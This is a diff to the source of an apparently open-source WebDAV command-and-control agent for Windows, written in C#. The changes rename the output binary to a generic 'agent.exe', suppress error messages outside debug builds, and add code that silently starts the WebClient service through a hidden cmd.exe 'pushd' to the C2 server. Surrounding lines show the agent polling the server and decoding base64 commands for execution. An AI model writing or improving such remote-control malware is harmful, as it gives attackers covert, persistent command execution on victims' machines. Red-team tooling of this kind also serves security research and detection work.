@@ -2,16 +2,16 @@
 Author: Arno0x0x, Twitter: @Arno0x0x
 
 -------------------- x64 platform ----------------
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:webdavc2_agent.exe *.cs
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:agent.exe *.cs
 
 Or, with debug information:
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /define:DEBUG /out:webdavc2_agent_debug.exe *.cs
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /define:DEBUG /out:agent_debug.exe *.cs
 
 -------------------- x86 platform ----------------
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:webdavc2_agent.exe *.cs
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:agent.exe *.cs
 
 Or, with debug information:
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /define:DEBUG /out:webdavc2_agent_debug.exe *.cs
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /define:DEBUG /out:agent_debug.exe *.cs
 */
 
 using System;
@@ -20,6 +20,7 @@ using System.IO;
 using System.Diagnostics;
 using System.Text;
 using System.Collections.Generic;
+using System.ServiceProcess;
 
 namespace webdavc2
 {
@@ -56,9 +57,37 @@ namespace webdavc2
 			}
             else
             {
+ #if (DEBUG)
                 Console.WriteLine("[ERROR] Missing arguments");
+#endif
 				System.Environment.Exit(-1);
             }
+
+			//---------------------------------------------------------------------
+			// Check if the WebClient service is started. If not, try to start using the 'pushd' 
+			// command as it allows an unprivileged user to start it
+            ServiceController sc = new ServiceController("webclient");
+            if ((sc.Status.Equals(ServiceControllerStatus.Stopped)) || (sc.Status.Equals(ServiceControllerStatus.StopPending)))
+			{
+				Process process = new Process();
+				ProcessStartInfo startInfo = new ProcessStartInfo();
+				startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+				startInfo.FileName = "cmd.exe";
+				startInfo.Arguments = "/c pushd " + serverName + " & popd";
+				process.StartInfo = startInfo;
+				process.Start();
+				process.WaitForExit(); // Wait for the command to complete in order for the WebClient service to be started
+				sc.Refresh(); // Refresh service status
+			}
+
+			if ((sc.Status.Equals(ServiceControllerStatus.Stopped)) || (sc.Status.Equals(ServiceControllerStatus.StopPending)))
+			{
+#if (DEBUG)
+				Console.WriteLine("[ERROR] WebClient service could not be started");
+#endif
+
+				System.Environment.Exit(-1);
+			}
 			
 			//---------------------------------------------------------------------
             // Create an instance of the C2_Agent
@@ -77,7 +106,7 @@ namespace webdavc2
                 Console.WriteLine("[Main loop] Going to sleep for " + sleepTime / 1000 + " seconds");
 #endif
 
-				 // Wait for the polling period to time out
+				// Wait for the polling period to time out
                 Thread.Sleep(sleepTime);
 #if (DEBUG)
                 Console.WriteLine("[Main loop] Waking up");
@@ -142,7 +171,7 @@ namespace webdavc2
 				command = Encoding.UTF8.GetString(Convert.FromBase64String(dataReceived.ToString().Replace("_","/")));
 
 #if (DEBUG)				
-				Console.WriteLine("Command to be execute: [" + command + "]");
+				Console.WriteLine("Command to be executed: [" + command + "]");
 #endif
 				
 				//---------------------------------------------------------------------------------------------------
